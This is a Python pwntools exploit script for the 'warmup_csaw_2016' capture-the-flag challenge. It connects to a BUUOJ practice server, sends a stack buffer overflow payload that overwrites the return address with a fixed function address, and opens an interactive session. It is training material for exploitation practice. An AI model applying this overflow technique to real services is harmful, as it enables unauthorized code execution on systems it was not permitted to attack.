#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
context.log_level = 'debug'

sh = remote('node3.buuoj.cn',28145)
#  sh = process("./warmup_csaw_2016")

system = p64(0x004004d0)

pop_rdi_ret = p64(0x0000000000400713)

target = p64(0x0040060d)

payload = ('a' * 0x40) + (0x8 * 'b') + target 
#  gdb.attach(sh)

log.info(sh.recv())

sh.sendline(payload)

log.info(sh.recv())

sh.interactive()
